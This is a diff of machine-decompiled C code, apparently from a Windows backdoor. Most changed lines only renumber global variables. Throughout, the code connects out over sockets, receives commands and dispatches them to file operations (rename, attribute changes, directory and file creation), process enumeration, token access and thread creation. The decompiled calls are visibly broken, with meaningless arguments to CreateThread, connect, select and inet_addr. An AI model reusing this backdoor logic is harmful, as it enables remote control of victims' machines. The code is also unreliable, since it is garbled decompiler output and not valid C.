+                *(int32_t *)(g8 - 4) = (int32_t)g41;
                 closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
@@ -3417,12 +3435,12 @@ int32_t function_4028eb(void) {
         // 0x402a55
         // branch -> 0x402a5e
         // 0x402a5e
-        v7 = g72;
+        v7 = g77;
         if (v7 != g5) {
             // 0x402a67
             *(int32_t *)(g8 - 4) = v7;
             CloseHandle(&lpThreadAttributes->e0);
-            g72 = g5;
+            g77 = g5;
             // branch -> 0x402a74
         }
         // 0x402a74
@@ -3435,14 +3453,14 @@ int32_t function_4028eb(void) {
         *(int32_t *)(v13 - 24) = g5;
         threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
         v19 = (int32_t)threadHandle;
-        g72 = v19;
+        g77 = v19;
         if (v19 != g5) {
             // 0x402aa0
             result = g7;
             // branch -> 0x402aa2
         } else {
             // 0x402a90
-            *(int32_t *)(g8 - 4) = (int32_t)g36;
+            *(int32_t *)(g8 - 4) = (int32_t)g41;
             closesocket((int32_t)lpThreadAttributes);
             // branch -> 0x402a9c
             // 0x402a9c
@@ -3458,7 +3476,7 @@ int32_t function_4028eb(void) {
         return result;
     }
     int32_t v21 = g5; // 0x4029a4
-    if ((int32_t)g62 != v21) {
+    if ((int32_t)g67 != v21) {
         struct fd_set * protocol2 = (struct fd_set *)&writefds;
         v9 = g8;
         // branch -> 0x4029b0
@@ -3467,7 +3485,7 @@ int32_t function_4028eb(void) {
         *(int32_t *)(v9 - 8) = g7;
         *(int32_t *)(v9 - 12) = 2;
         sock_fd = socket((int32_t)(char *)nfds, (int32_t)readfds, (int32_t)protocol2);
-        g36 = (char *)sock_fd;
+        g41 = (char *)sock_fd;
         if (sock_fd != -1) {
             // 0x4029c8
             v14 = &v5;
@@ -3480,30 +3498,30 @@ int32_t function_4028eb(void) {
             int32_t v22;
             ioctlsocket(v5, v1, (int32_t *)v22);
             timeout = 60;
-            v16 = (int32_t)g61 | (int32_t)g36 & -0x10000;
+            v16 = (int32_t)g66 | (int32_t)g41 & -0x10000;
             *(int32_t *)(g8 - 4) = v16;
             host_short = g7;
             writefds = host_short;
             addr2 = 2;
             v15 = htons(host_short);
-            *(int32_t *)(g8 - 4) = (int32_t)&g60;
+            *(int32_t *)(g8 - 4) = (int32_t)&g65;
             sock = inet_addr((char *)((int32_t)v15 & 0xffff));
             v17 = (struct _SECURITY_ATTRIBUTES *)sock;
             v6 = g8;
             *(int32_t *)(v6 - 4) = 16;
             *(int32_t *)(v6 - 8) = (int32_t)&addr2;
-            *(int32_t *)(v6 - 12) = (int32_t)g36;
+            *(int32_t *)(v6 - 12) = (int32_t)g41;
             connect(sock, (struct sockaddr *)&addr, (int32_t)&addr);
             v11 = g8;
             *(int32_t *)(v11 - 4) = (int32_t)&timeout;
             *(int32_t *)(v11 - 8) = g5;
             *(int32_t *)(v11 - 12) = v2;
             *(int32_t *)(v11 - 16) = g5;
-            *(int32_t *)(v11 - 20) = (int32_t)g36 + 1;
+            *(int32_t *)(v11 - 20) = (int32_t)g41 + 1;
             v18 = select(sock, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct fd_set *)&addr, (struct timeval *)&addr);
             if (v18 < 1) {
                 // 0x402a90
-                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                *(int32_t *)(g8 - 4) = (int32_t)g41;
                 closesocket((int32_t)v17);
                 // branch -> 0x402a9c
                 // 0x402a9c
@@ -3517,19 +3535,19 @@ int32_t function_4028eb(void) {
                 return 0;
             }
             // 0x402a47
-            g56 = g7;
+            g61 = g7;
             lpThreadAttributes = v17;
             // branch -> 0x402a4d
             // 0x402a4d
             v12 = g5;
-            if (g54 != v12) {
+            if (g59 != v12) {
                 // 0x402a5e
-                v7 = g72;
+                v7 = g77;
                 if (v7 != v12) {
                     // 0x402a67
                     *(int32_t *)(g8 - 4) = v7;
                     CloseHandle(&lpThreadAttributes->e0);
-                    g72 = g5;
+                    g77 = g5;
                     // branch -> 0x402a74
                 }
                 // 0x402a74
@@ -3542,14 +3560,14 @@ int32_t function_4028eb(void) {
                 *(int32_t *)(v13 - 24) = g5;
                 threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
                 v19 = (int32_t)threadHandle;
-                g72 = v19;
+                g77 = v19;
                 if (v19 != g5) {
                     // 0x402aa0
                     result = g7;
                     // branch -> 0x402aa2
                 } else {
                     // 0x402a90
-                    *(int32_t *)(g8 - 4) = (int32_t)g36;
+                    *(int32_t *)(g8 - 4) = (int32_t)g41;
                     closesocket((int32_t)lpThreadAttributes);
                     // branch -> 0x402a9c
                     // 0x402a9c
@@ -3579,12 +3597,12 @@ int32_t function_4028eb(void) {
             // 0x402a55
             // branch -> 0x402a5e
             // 0x402a5e
-            v7 = g72;
+            v7 = g77;
             if (v7 != g5) {
                 // 0x402a67
                 *(int32_t *)(g8 - 4) = v7;
                 CloseHandle(&lpThreadAttributes->e0);
-                g72 = g5;
+                g77 = g5;
                 // branch -> 0x402a74
             }
             // 0x402a74
@@ -3597,14 +3615,14 @@ int32_t function_4028eb(void) {
             *(int32_t *)(v13 - 24) = g5;
             threadHandle = CreateThread(lpThreadAttributes, (int32_t)&addr, (int32_t (*)(int32_t *))&addr, &addr, (int32_t)&addr, &addr);
             v19 = (int32_t)threadHandle;
-            g72 = v19;
+            g77 = v19;
             if (v19 != g5) {
                 // 0x402aa0
                 result = g7;
                 // branch -> 0x402aa2
             } else {
                 // 0x402a90
-                *(int32_t *)(g8 - 4) = (int32_t)g36;
+                *(int32_t *)(g8 - 4) = (int32_t)g41;
                 closesocket((int32_t)lpThreadAttributes);
                 // branch -> 0x402a9c
                 // 0x402a9c
@@ -3639,15 +3657,15 @@ int32_t function_402aa7(void) {
     int32_t v2 = (int32_t)moduleHandle; // 0x402ab7
     g5 = (int32_t)GetProcAddress(moduleHandle, "GetTickCount");
     FreeLibrary(moduleHandle);
-    int32_t v3 = *(int32_t *)&g33; // 0x402ae07
-    memcpy(&((struct _NETRESOURCEA *)v3)->e0, (int32_t *)g34, (int32_t)g29);
+    int32_t v3 = *(int32_t *)&g38; // 0x402ae07
+    memcpy(&((struct _NETRESOURCEA *)v3)->e0, (int32_t *)g39, (int32_t)g34);
     g7 = 0;
-    *(int32_t *)&g30 = *(int32_t *)&g29;
-    int32_t v4 = g32; // 0x402afa
-    g31 = g32;
-    g28 = 0;
-    g25 = NULL;
-    g35 = v4;
+    *(int32_t *)&g35 = *(int32_t *)&g34;
+    int32_t v4 = g37; // 0x402afa
+    g36 = g37;
+    g33 = 0;
+    g30 = NULL;
+    g40 = v4;
     switch (v4) {
         case 65: {
             // 0x402b93
@@ -3777,7 +3795,7 @@ int32_t function_402aa7(void) {
         }
         case 88: {
             // 0x402bc7
-            g71 = 0;
+            g76 = 0;
             // branch -> 0x402bf7
             break;
         }
@@ -3826,11 +3844,11 @@ int32_t function_402aa7(void) {
     }
     int32_t v5 = g7; // 0x402bf7
     g5 = 1;
-    g25 = (char *)1;
+    g30 = (char *)1;
     int32_t result; // 0x402c4f
-    if (g26 != v5) {
+    if (g31 != v5) {
         // 0x402c08
-        g26 = v5;
+        g31 = v5;
         g7 = (int32_t)"&ha_j]?&";
         int32_t v6 = 90; // bp-260
         strlen("&ha_j]?&");
@@ -3853,13 +3871,13 @@ int32_t function_402aa7(void) {
 // Address range: 0x402ced - 0x402d26
 int32_t function_402ced(void) {
     // 0x402ced
-    if (WaitForSingleObject((int32_t *)g24, 0) != 0) {
+    if (WaitForSingleObject((int32_t *)g29, 0) != 0) {
         // 0x402d19
         Sleep(1000);
         return function_402ced();
     }
     // 0x402cff
-    SetEvent((int32_t *)g23);
+    SetEvent((int32_t *)g28);
     WSACleanup();
     ExitProcess(1);
     // UNREACHABLE
@@ -3870,7 +3888,7 @@ int32_t function_402d26(void) {
     int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x402d2e
     GetProcAddress(moduleHandle, "GetTickCount");
     int32_t v1 = FreeLibrary(moduleHandle); // 0x402d45
-    g35 = v1;
+    g40 = v1;
     // branch -> 0x402d55
     while (true) {
         // 0x402d55
@@ -3885,10 +3903,10 @@ int32_t function_402d26(void) {
             // branch -> 0x402d69
         }
         // 0x402d69
-        if (v4 - g35 >= 0x1b7741) {
+        if (v4 - g40 >= 0x1b7741) {
             // 0x402d78
-            g71 = 0;
-            g35 = v3;
+            g76 = 0;
+            g40 = v3;
             // branch -> 0x402d85
         }
         // 0x402d85
@@ -3910,7 +3928,7 @@ int32_t function_402d8f(void) {
     g3 = 0;
     int32_t dwMilliseconds = 0; // bp-16
     g5 = 0x6832;
-    g54 = 0;
+    g59 = 0;
     char v2; // bp-8200
     int32_t v3 = &v2; // 0x402e29
     int32_t v4 = 0; // 0x402db0
@@ -3921,7 +3939,7 @@ int32_t function_402d8f(void) {
         int32_t v6; // 0x402e23
         int32_t v7; // 0x402eb5
         char v8; // 0x402e15
-        if (g32 != (char)v4) {
+        if (g37 != (char)v4) {
             // 0x402db0
             v6 = v4;
             v5 = g7;
@@ -3930,8 +3948,8 @@ int32_t function_402d8f(void) {
           lab_0x402e15:;
             int32_t v9 = v5 - 5; // 0x402e1b
             g7 = v9;
-            g32 = v8;
-            g27 = v6;
+            g37 = v8;
+            g32 = v6;
             // branch -> 0x402e29
             int32_t v10; // 0x402e90
             while (true) {
@@ -3941,40 +3959,40 @@ int32_t function_402d8f(void) {
                 int32_t v11 = function_402f2f(); // 0x402e31
                 int32_t * v12 = (int32_t *)(g8 + 4); // 0x402e3a
                 g4 = *v12;
-                g29 = (struct _WIN32_FIND_DATAA *)v11;
+                g34 = (struct _WIN32_FIND_DATAA *)v11;
                 if (v11 == -1) {
                     // 0x402ea7
-                    g32 = g3;
+                    g37 = g3;
                     v7 = g3;
                     // branch -> 0x402ead
                 } else {
                     // 0x402e42
                     *v12 = v11;
                     *(int32_t *)g8 = v3;
-                    *(int32_t *)(g8 - 4) = g34;
+                    *(int32_t *)(g8 - 4) = g39;
                     memcpy((int32_t *)dwMilliseconds, (int32_t *)0, v1);
-                    int32_t v13 = g7 - (int32_t)g29; // 0x402e55
+                    int32_t v13 = g7 - (int32_t)g34; // 0x402e55
                     g7 = v13;
                     int32_t v14 = g3; // 0x402e5e
                     int32_t v15 = v14;
                     if ((struct _WIN32_FIND_DATAA *)v13 <= (struct _WIN32_FIND_DATAA *)v14) {
                         // 0x402e62
-                        if ((int32_t)g25 == v14) {
+                        if ((int32_t)g30 == v14) {
                             // 0x402e6a
                             *(int32_t *)(g8 + 8) = 1;
                             Sleep(dwMilliseconds);
-                            if ((int32_t)g25 == g3) {
+                            if ((int32_t)g30 == g3) {
                                 *(int32_t *)(g8 - 4) = 1;
                                 Sleep(dwMilliseconds);
-                                while ((int32_t)g25 == g3) {
+                                while ((int32_t)g30 == g3) {
                                     // 0x402e6a
                                     *(int32_t *)(g8 - 4) = 1;
                                     Sleep(dwMilliseconds);
                                     // continue -> 0x402e6a
                                 }
                                 // 0x402e82
-                                g57 = 1;
-                                g28 = 1;
+                                g62 = 1;
+                                g33 = 1;
                                 // branch -> 0x402e8c
                               lab_0x402e8c:
                                 while (true) {
@@ -3982,7 +4000,7 @@ int32_t function_402d8f(void) {
                                     *(int32_t *)(g8 - 4) = 1;
                                     Sleep(dwMilliseconds);
                                     v10 = g3;
-                                    if (g28 == v10) {
+                                    if (g33 == v10) {
                                         // break -> 0x402e98
                                         break;
                                     }
@@ -4004,23 +4022,23 @@ int32_t function_402d8f(void) {
                         }
                     }
                     // 0x402e82
-                    g57 = v15;
-                    g28 = 1;
+                    g62 = v15;
+                    g33 = 1;
                     // branch -> 0x402e8c
                     goto lab_0x402e8c;
                 }
                 // 0x402ead
-                if (g54 == v7) {
+                if (g59 == v7) {
                     // 0x402eb5
-                    g71 = v7;
+                    g76 = v7;
                     // branch -> 0x402ebb
                 }
                 // 0x402ebb
-                g53 = 1;
+                g58 = 1;
                 return 0;
             }
             // 0x402e9c
-            g32 = v10;
+            g37 = v10;
             // branch -> 0x402db0
           lab_0x402db0_2:
             // 0x402db0
@@ -4054,7 +4072,7 @@ int32_t function_402d8f(void) {
                             goto lab_0x402e15;
                         } else {
                             // 0x402e07
-                            *v18 = g22;
+                            *v18 = g27;
                             SetEvent((int32_t *)dwMilliseconds);
                             // branch -> 0x402db0
                             goto lab_0x402db0_2;
@@ -4066,7 +4084,7 @@ int32_t function_402d8f(void) {
                         continue;
                     } else {
                         // 0x402df2
-                        g26 = 1;
+                        g31 = 1;
                         // branch -> 0x402db0
                         goto lab_0x402db0_3;
                     }
@@ -4077,13 +4095,13 @@ int32_t function_402d8f(void) {
             // branch -> 0x402ead
         }
         // 0x402ead
-        if (g54 == v7) {
+        if (g59 == v7) {
             // 0x402eb5
-            g71 = v7;
+            g76 = v7;
             // branch -> 0x402ebb
         }
         // 0x402ebb
-        g53 = 1;
+        g58 = 1;
         return 0;
     }
 }
@@ -4101,7 +4119,7 @@ int32_t function_402ece(void) {
         *(int32_t *)(v2 - 8) = 1;
         char v3; // bp-5
         *(int32_t *)(v2 - 12) = (int32_t)&v3;
-        *(int32_t *)(v2 - 16) = (int32_t)g36;
+        *(int32_t *)(v2 - 16) = (int32_t)g41;
         uint32_t v4 = recv(sock, (char *)g3, g4, flags); // 0x402eea
         int32_t v5; // 0x402f2b
         if (v4 == -1) {
@@ -4195,7 +4213,7 @@ int32_t function_402f2f(void) {
         *(int32_t *)(v5 - 4) = 0;
         *(int32_t *)(v5 - 8) = v4 - v2;
         *(int32_t *)(v5 - 12) = v2 + *(int32_t *)(v5 + 16);
-        *(int32_t *)(v5 - 16) = (int32_t)g36;
+        *(int32_t *)(v5 - 16) = (int32_t)g41;
         int32_t * flags;
         int32_t v7 = recv(sock, buf, g3, (int32_t)&flags); // 0x402f5d
         if (v7 >= 0 == (v7 != 0)) {
@@ -4256,9 +4274,9 @@ int32_t function_402f9b(void) {
     int32_t v1 = &lpBuffer; // 0x402f9e
     char v2 = 65; // bp-652
     int32_t str; // bp-647
-    strcpy((char *)&str, (char *)&g68);
-    int32_t len = strlen((char *)(int32_t)&g68); // 0x402fc3
-    *(int32_t *)(len - 642 + g2) = g38;
+    strcpy((char *)&str, (char *)&g73);
+    int32_t len = strlen((char *)(int32_t)&g73); // 0x402fc3
+    *(int32_t *)(len - 642 + g2) = g43;
     g7 = 10 + len;
     int32_t v3; // 0x4030c2
     int32_t v4; // 0x4030b5
@@ -4415,7 +4433,7 @@ int32_t function_4030c7(void) {
     int32_t handleClosed; // 0x403278
     int32_t v19; // 0x403189
     int32_t * str2;
-    if (g66 == 2) {
+    if (g71 == 2) {
         int32_t * moduleHandle = LoadLibraryA("psapi.dll"); // 0x4030ec
         int32_t hModule = (int32_t)moduleHandle; // 0x4030ec
         if (hModule == g3) {
@@ -4445,19 +4463,19 @@ int32_t function_4030c7(void) {
         uSize = (int32_t)str;
         GetWindowsDirectoryA(lpBuffer, uSize);
         v7 = g8;
-        *(int32_t *)(v7 - 4) = (int32_t)&g11;
+        *(int32_t *)(v7 - 4) = (int32_t)&g15;
         *(int32_t *)(v7 - 8) = (int32_t)&v4;
         strcpy(lpBuffer, str);
         v8 = g8;
-        *(int32_t *)(v8 - 4) = (int32_t)&g12;
+        *(int32_t *)(v8 - 4) = (int32_t)&g16;
         *(int32_t *)(v8 - 8) = v15;
         strcat(lpBuffer, str);
         v9 = g8;
-        *(int32_t *)(v9 - 4) = (int32_t)&g13;
+        *(int32_t *)(v9 - 4) = (int32_t)&g17;
         *(int32_t *)(v9 - 8) = v15;
         strcat(lpBuffer, str);
         v10 = g8;
-        *(int32_t *)(v10 - 4) = (int32_t)&g50;
+        *(int32_t *)(v10 - 4) = (int32_t)&g55;
         *(int32_t *)(v10 - 8) = v15;
         strcat(lpBuffer, str);
         v11 = g8;
@@ -4480,7 +4498,7 @@ int32_t function_4030c7(void) {
                     hObject = NULL;
                     v14 = g8;
                     v17 = (int32_t *)(v14 - 4);
-                    if (g66 != 2) {
+                    if (g71 != 2) {
                         goto lab_0x403218;
                     }
                     goto lab_0x4031cf;
@@ -4513,19 +4531,19 @@ int32_t function_4030c7(void) {
     uSize = (int32_t)str;
     GetWindowsDirectoryA(lpBuffer, uSize);
     v7 = g8;
-    *(int32_t *)(v7 - 4) = (int32_t)&g11;
+    *(int32_t *)(v7 - 4) = (int32_t)&g15;
     *(int32_t *)(v7 - 8) = (int32_t)&v4;
     strcpy(lpBuffer, str);
     v8 = g8;
-    *(int32_t *)(v8 - 4) = (int32_t)&g12;
+    *(int32_t *)(v8 - 4) = (int32_t)&g16;
     *(int32_t *)(v8 - 8) = v15;
     strcat(lpBuffer, str);
     v9 = g8;
-    *(int32_t *)(v9 - 4) = (int32_t)&g13;
+    *(int32_t *)(v9 - 4) = (int32_t)&g17;
     *(int32_t *)(v9 - 8) = v15;
     strcat(lpBuffer, str);
     v10 = g8;
-    *(int32_t *)(v10 - 4) = (int32_t)&g50;
+    *(int32_t *)(v10 - 4) = (int32_t)&g55;
     *(int32_t *)(v10 - 8) = v15;
     strcat(lpBuffer, str);
     v11 = g8;
@@ -4549,7 +4567,7 @@ int32_t function_4030c7(void) {
                 v14 = g8;
                 v17 = (int32_t *)(v14 - 4);
                 int32_t v21; // 0x403233
-                if (g66 != 2) {
+                if (g71 != 2) {
                   lab_0x403218:;
                     // 0x403218
                     int32_t v22; // bp-288
@@ -4587,7 +4605,7 @@ int32_t function_4030c7(void) {
                 *(int32_t *)(v21 - 8) = v1;
                 if (lstrcmpiA(hObject, (char *)&str2) == 0) {
                     int32_t v26 = (int32_t)hObject; // 0x40326f
-                    if (g66 != 2) {
+                    if (g71 != 2) {
                         // 0x40326f
                         function_4038e7(v26);
                         // branch -> 0x403274
@@ -4782,7 +4800,7 @@ int32_t function_40338e(int32_t ** a1) {
             // 0x4033e9
             int32_t v9; // bp-32
             int32_t v10 = &v9; // 0x4033e9
-            int32_t v11 = function_403319((int32_t *)TokenHandle, (int32_t)(bool)&g14, v10); // 0x4033f5
+            int32_t v11 = function_403319((int32_t *)TokenHandle, (int32_t)(bool)&g18, v10); // 0x4033f5
             int32_t v12 = &v7; // 0x403480
             if (v11 != 0) {
                 int32_t v13 = (int32_t)OpenProcess(0x80000, (dwOptions & 1) != 0, dwProcessId); // 0x40340a
@@ -4918,7 +4936,7 @@ int32_t function_4034cb(void) {
         // branch -> 0x403582
     } else {
         // 0x403531
-        strcat((char *)&lpBuffer, g13);
+        strcat((char *)&lpBuffer, g17);
         strcat((char *)&lpBuffer, (char *)(len + v3));
         g1 = (int32_t)strcpy(str, (char *)&lpBuffer);
         v4 = v6;
@@ -4975,7 +4993,7 @@ int32_t function_403587(void) {
     int32_t v30; // 0x4035f3
     int32_t v31; // 0x40364c
     int32_t * str2;
-    if (g66 == 2) {
+    if (g71 == 2) {
         int32_t * moduleHandle = LoadLibraryA((char *)67); // 0x4035ba
         int32_t v32 = (int32_t)moduleHandle; // 0x4035ba
         g5 = v32;
@@ -5091,7 +5109,7 @@ int32_t function_403587(void) {
                     GetPriorityClass((int32_t *)str);
                     *(int32_t *)(g8 - 4) = v31;
                     CloseHandle((int32_t *)str);
-                    v16 = g66;
+                    v16 = g71;
                     if (v16 != 2) {
                         v17 = v16;
                         goto lab_0x4036da;
@@ -5168,7 +5186,7 @@ int32_t function_403587(void) {
                 GetPriorityClass((int32_t *)str);
                 *(int32_t *)(g8 - 4) = v31;
                 CloseHandle((int32_t *)str);
-                v16 = g66;
+                v16 = g71;
                 v17 = v16;
                 if (v16 == 2) {
                   lab_0x40366b:
@@ -5198,7 +5216,7 @@ int32_t function_403587(void) {
                     // 0x4036d3
                     *(int32_t *)(g8 + 4) = g7;
                     CloseHandle((int32_t *)str);
-                    v17 = g66;
+                    v17 = g71;
                     // branch -> 0x4036da
                 }
               lab_0x4036da:
@@ -5232,7 +5250,7 @@ int32_t function_403587(void) {
                     // branch -> 0x40376f
                 } else {
                     // 0x40374a
-                    *(int32_t *)(g8 - 4) = (int32_t)&g10;
+                    *(int32_t *)(g8 - 4) = (int32_t)&g14;
                     *(int32_t *)(g8 - 8) = v24;
                     strcpy(hObject, (char *)c);
                     *(int32_t *)(g8 - 4) = (int32_t)"OS Kernel";
@@ -5258,13 +5276,13 @@ int32_t function_403587(void) {
                     // branch -> 0x403798
                 }
                 // 0x403798
-                *(int32_t *)(v36 - 4) = (int32_t)&g16;
+                *(int32_t *)(v36 - 4) = (int32_t)&g20;
                 *(int32_t *)(v36 - 8) = v24;
                 strcat(hObject, (char *)c);
                 *(int32_t *)(g8 - 4) = v26;
                 *(int32_t *)(g8 - 8) = v24;
                 strcat(hObject, (char *)c);
-                *(int32_t *)(g8 - 4) = (int32_t)&g15;
+                *(int32_t *)(g8 - 4) = (int32_t)&g19;
                 *(int32_t *)(g8 - 8) = v24;
                 strcat(hObject, (char *)c);
                 *(int32_t *)(g8 - 4) = v24;
@@ -5379,9 +5397,9 @@ int32_t function_403887(int32_t a1) {
 
 // Address range: 0x4038c8 - 0x4038e7
 int32_t function_4038c8(void) {
-    int32_t v1 = g33->e0; // 0x4038cd
+    int32_t v1 = g38->e0; // 0x4038cd
     function_403887(v1);
-    g63 = 69;
+    g68 = 69;
     return function_403e89(v1);
 }
 
@@ -5413,17 +5431,17 @@ int32_t function_4038e7(int32_t a1) {
 
 // Address range: 0x403929 - 0x403948
 int32_t function_403929(void) {
-    int32_t v1 = g33->e0; // 0x40392e
+    int32_t v1 = g38->e0; // 0x40392e
     function_4038e7(v1);
-    g63 = 69;
+    g68 = 69;
     return function_403e89(v1);
 }
 
 // Address range: 0x403948 - 0x403966
 int32_t function_403948(void) {
-    int32_t v1 = *(int32_t *)&g33; // 0x4039482
+    int32_t v1 = *(int32_t *)&g38; // 0x4039482
     function_40511a((char *)v1);
-    g63 = 69;
+    g68 = 69;
     return function_403e89(v1);
 }
 
@@ -5434,30 +5452,30 @@ int32_t function_403966(void) {
     int32_t v2 = g7; // bp-1032
     int32_t str; // bp-1028
     char * str3 = (char *)&str; // bp-1040
-    strcpy((char *)&str, (char *)*(int32_t *)&g33);
+    strcpy((char *)&str, (char *)*(int32_t *)&g38);
     char * str2 = (char *)&str; // bp-1044
     int32_t len = strlen((char *)&str); // 0x403989
     int32_t v3; // bp-516
     int32_t v4 = &v3; // 0x4039a3
     int32_t v5 = len + 1; // 0x40399327
     g7 = v5;
-    if ((struct _WIN32_FIND_DATAA *)v5 < g30) {
+    if ((struct _WIN32_FIND_DATAA *)v5 < g35) {
         int32_t v6 = &v2; // 0x4039a2
         while (true) {
             // 0x40399c
             *(int32_t *)(v6 - 4) = (int32_t)&str;
             *(int32_t *)(v6 - 8) = v4;
             strcpy(str2, str3);
-            *(int32_t *)(g8 - 4) = g7 + (int32_t)g33;
+            *(int32_t *)(g8 - 4) = g7 + (int32_t)g38;
             *(int32_t *)(g8 - 8) = v4;
             strcat(str2, str3);
-            *(int32_t *)(g8 - 4) = g7 + (int32_t)g33;
+            *(int32_t *)(g8 - 4) = g7 + (int32_t)g38;
             g7 += strlen(str2) + 1;
             *(int32_t *)(g8 + 16) = 0;
             *(int32_t *)(g8 + 12) = v4;
             SetFileAttributesA(str2, (int32_t)str3);
             int32_t * v7 = (int32_t *)(g8 - 4); // 0x403a06
-            if (*(char *)(g7 + (int32_t)g33) != 48) {
+            if (*(char *)(g7 + (int32_t)g38) != 48) {
                 // 0x403a00
                 *v7 = 76;
                 *(int32_t *)(g8 - 8) = v4;
@@ -5471,7 +5489,7 @@ int32_t function_403966(void) {
             }
             int32_t v8 = g7 + 1; // 0x403993
             g7 = v8;
-            if ((struct _WIN32_FIND_DATAA *)v8 < g30) {
+            if ((struct _WIN32_FIND_DATAA *)v8 < g35) {
                 // 0x403993
                 v6 = g8;
                 // branch -> 0x40399c
@@ -5480,7 +5498,7 @@ int32_t function_403966(void) {
         }
     }
     // 0x403a12
-    g63 = 79;
+    g68 = 79;
     int32_t result = function_403e89((int32_t)str2); // 0x403a19
     g7 = *(int32_t *)g8;
     g2 = v1;
@@ -5489,12 +5507,12 @@ int32_t function_403966(void) {
 
 // Address range: 0x403a21 - 0x403a58
 int32_t function_403a21(void) {
-    struct _NETRESOURCEA * str = g33; // 0x403a21
+    struct _NETRESOURCEA * str = g38; // 0x403a21
     int32_t v1 = g7; // 0x403a26
     g7 = (int32_t)str;
     int32_t file_path = g7; // 0x403a3a
-    rename((char *)file_path, (char *)(strlen((char *)str) + 1 + (int32_t)g33));
-    g63 = 79;
+    rename((char *)file_path, (char *)(strlen((char *)str) + 1 + (int32_t)g38));
+    g68 = 79;
     int32_t result = function_403e89(file_path); // 0x403a51
     g7 = v1;
     return result;
@@ -5502,14 +5520,14 @@ int32_t function_403a21(void) {
 
 // Address range: 0x403a58 - 0x403ae7
 int32_t function_403a58(void) {
-    int32_t len = strlen((char *)*(int32_t *)&g33); // 0x403a63
-    struct _NETRESOURCEA * str = g33; // 0x403a68
+    int32_t len = strlen((char *)*(int32_t *)&g38); // 0x403a63
+    struct _NETRESOURCEA * str = g38; // 0x403a68
     unsigned char v1 = *(char *)(len + 1 + (int32_t)str); // 0x403a6f
     int32_t v2 = g3; // 0x403a6f
     int32_t len2 = strlen((char *)str); // 0x403a73
-    struct _NETRESOURCEA * str2 = g33; // 0x403a78
+    struct _NETRESOURCEA * str2 = g38; // 0x403a78
     int32_t len3 = strlen((char *)str2); // 0x403a86
-    struct _NETRESOURCEA * lpFileName = g33; // 0x403a8b
+    struct _NETRESOURCEA * lpFileName = g38; // 0x403a8b
     int32_t v3 = GetFileAttributesA((char *)lpFileName); // 0x403a9c
     g3 = (int32_t)lpFileName;
     int32_t v4; // 0x403ab8
@@ -5544,23 +5562,23 @@ int32_t function_403a58(void) {
         dwFileAttributes = v5 | 4;
         // branch -> 0x403ac6
     }
-    int32_t lpFileName2 = *(int32_t *)&g33; // 0x403ac75
+    int32_t lpFileName2 = *(int32_t *)&g38; // 0x403ac75
     SetFileAttributesA((char *)lpFileName2, dwFileAttributes);
-    g63 = 69;
+    g68 = 69;
     return function_403e89(lpFileName2);
 }
 
 // Address range: 0x403ae7 - 0x403b07
 int32_t function_403ae7(void) {
-    int32_t lpPathName = *(int32_t *)&g33; // 0x403ae93
+    int32_t lpPathName = *(int32_t *)&g38; // 0x403ae93
     CreateDirectoryA((char *)lpPathName, NULL);
-    g63 = 69;
+    g68 = 69;
     return function_403e89(lpPathName);
 }
 
 // Address range: 0x403b07 - 0x403b42
 int32_t function_403b07(void) {
-    int32_t lpFileName = *(int32_t *)&g33; // 0x403b153
+    int32_t lpFileName = *(int32_t *)&g38; // 0x403b153
     int32_t * fileHandle = CreateFileA((char *)lpFileName, 0x40000000, 0, NULL, 2, 2, NULL); // 0x403b1b
     char v1;
     int32_t v2; // 0x403b3d
@@ -5576,7 +5594,7 @@ int32_t function_403b07(void) {
         v1 = 69;
     }
     // 0x403b3d
-    g63 = v1;
+    g68 = v1;
     return function_403e89(v2);
 }
 
@@ -5586,14 +5604,14 @@ int32_t function_403b42(void) {
     g2 = &v1;
     int32_t v2 = g5; // bp-548
     int32_t v3 = &v2; // 0x403b4d
-    int32_t v4 = *(int32_t *)&g33; // 0x403b5a11
+    int32_t v4 = *(int32_t *)&g38; // 0x403b5a11
     struct _NETRESOURCEA * v5 = NULL; // bp-556
     *(int32_t *)&v5 = v4;
     int32_t v6 = (int32_t)&v5; // 0x403b5a
     int32_t str = 0; // bp-536
-    memcpy(&str, &((struct _NETRESOURCEA *)v4)->e0, *(int32_t *)&g30);
+    memcpy(&str, &((struct _NETRESOURCEA *)v4)->e0, *(int32_t *)&g35);
     g7 = 0x6b46;
-    int32_t found_char_pos = (int32_t)strrchr((char *)*(int32_t *)&g33, 92); // 0x403b74
+    int32_t found_char_pos = (int32_t)strrchr((char *)*(int32_t *)&g38, 92); // 0x403b74
     g1 = found_char_pos;
     function_403d8d(found_char_pos);
     char * found_char_pos2 = strrchr((char *)&str, 92); // 0x403b85
@@ -5652,7 +5670,7 @@ int32_t function_403b42(void) {
     int32_t v13 = (int32_t)v12; // 0x403bff
     if (v12 == (int32_t *)-1) {
         // 0x403c0d
-        strcpy((char *)(result + 44), g17);
+        strcpy((char *)(result + 44), g21);
         function_402830(result, 320, (char *)mem, (int32_t)&hFindFile);
         function_401e99(result, 320);
         free(mem);
@@ -5782,7 +5800,7 @@ int32_t function_403cd5(void) {
     } else {
         while (true) {
             // 0x403cef
-            if (g26 != 0) {
+            if (g31 != 0) {
                 // 0x403d16
                 // branch -> 0x403d1d
                 // 0x403d1d
@@ -5850,7 +5868,7 @@ int32_t function_403d21(char * lpFileName) {
                 // branch -> 0x403d57
             }
             // 0x403d57
-            if (g26 != 0) {
+            if (g31 != 0) {
                 // 0x403d74
                 *v3 = g7;
                 FindClose((int32_t *)hFindFile);
@@ -5883,7 +5901,7 @@ int32_t function_403d21(char * lpFileName) {
 // Address range: 0x403d8d - 0x403dda
 int32_t function_403d8d(int32_t a1) {
     // 0x403d8d
-    g58 = 0;
+    g63 = 0;
     if (a1 == 0) {
         // 0x403dd8
         return g1;
@@ -5911,10 +5929,10 @@ int32_t function_403d8d(int32_t a1) {
         g4 = *(int32_t *)g8;
         v2 = g8 + 4;
         if (len >= 2) {
-            int32_t v5 = g58; // 0x403dc1
+            int32_t v5 = g63; // 0x403dc1
             g1 = v5;
-            g58 = v5 + 1;
-            *(int32_t *)(4 * v5 + (int32_t)&g59) = v3;
+            g63 = v5 + 1;
+            *(int32_t *)(4 * v5 + (int32_t)&g64) = v3;
             v2 = g8;
